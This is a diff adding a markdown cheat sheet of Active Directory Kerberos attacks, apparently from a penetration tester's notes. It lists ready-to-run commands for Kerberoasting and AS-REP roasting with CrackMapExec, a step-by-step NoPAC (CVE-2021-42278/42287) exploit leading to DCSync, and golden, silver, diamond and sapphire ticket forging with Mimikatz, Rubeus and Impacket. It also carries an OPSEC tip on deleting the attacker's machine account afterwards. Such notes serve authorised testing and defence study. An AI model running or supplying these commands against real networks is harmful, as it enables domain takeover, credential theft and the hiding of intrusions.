@@ -1,0 +1,34 @@
+- Cerbero
+	- `cerbero ask -u contoso.local/Anakin --aes ecce3d24b29c7f044163ab4d9411c25b5698337318e98bf2903bbb7f6d76197e -k 192.168.100.2 -vv`
+- Silver Ticket services
+	- psexec - CIFS
+	- winrm - HOST & HTTP
+	- dcsync (DC only) - LDAP
+- Kerberoast/ASREPRoast (with CME)
+	- `crackmapexec ldap –u ValidUser –p ValidPass –kerberoast targets.txt`
+	- `crackmapexec ldap dc.domain.local -u ValidUser -p ValidPass --asreproast targets.txt`
+- NoPAC - CVE-2021-42278 and CVE-2021-42287
+	- Breakdown
+		- Create a new computer account with any name
+			- Requires SeMachineAccountPrivilege - by default all domain users can create up to 10 machine accounts
+		- Clear the SPNs
+		- Change the name to mimic the SamAccountName of a Domain Controller (without the "$")
+		- Request TGT for the machine account
+		- Change name of computer back to its original value
+		- Request TGS for the LDAP service using the TGT
+			- Account name no longer exists - Kerberos will append a "$" and now the name will match the DC
+		- DCSync
+	- Exploitation
+		- `python noPac.py domain.local/username:password -dc-ip <DC IP> -dc-host <DC name> --impersonate <user to impersonate> -dump`
+			- https://github.com/Ridter/noPac
+			- OPSEC - remember to delete the machine account after execution
+
+- Dominance Tickets
+	- Golden Tickets
+		- Mimikatz: `kerberos::golden /user:<user> /domain:<FQDN> /sid:<domain SID> /krbtgt:<NTLM hash> /ticket:golden.kirbi`
+	- Silver Tickets
+		- Rubeus: `Rubeus.exe silver /service:<SPN> /aes256:<preferred, but can use RC4> /user:<user> /domain:rlyeh.local /sid:<user SID>`
+	- Diamond Tickets
+		- Rubeus: `Rubeus.exe diamond /tgtdeleg /ticketuser:<user> /ticketuserid:<uid> /groups:<rid> /krbkey:<krbtgt>`
+	- Sapphire Tickets
+		- Impacket: `ticketer.py -request -user lowpriv -password 'pwd123' -impersonate administrator -domain rlyeh.local -domain-sid <sid> -aesKey <key> Administrator`
